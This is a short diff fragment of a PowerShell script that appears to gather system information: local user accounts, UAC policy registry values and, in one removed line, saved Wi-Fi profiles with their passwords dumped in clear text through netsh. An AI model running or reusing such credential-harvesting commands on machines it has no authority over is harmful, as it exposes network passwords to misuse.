@@ -76,10 +76,6 @@ $luser=Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Na
 
 ############################################################################################################################################################
 
-$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
-
-############################################################################################################################################################
-
 Function Get-RegistryValue($key, $value) {  (Get-ItemProperty $key $value).$value }
 
 $Key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" 
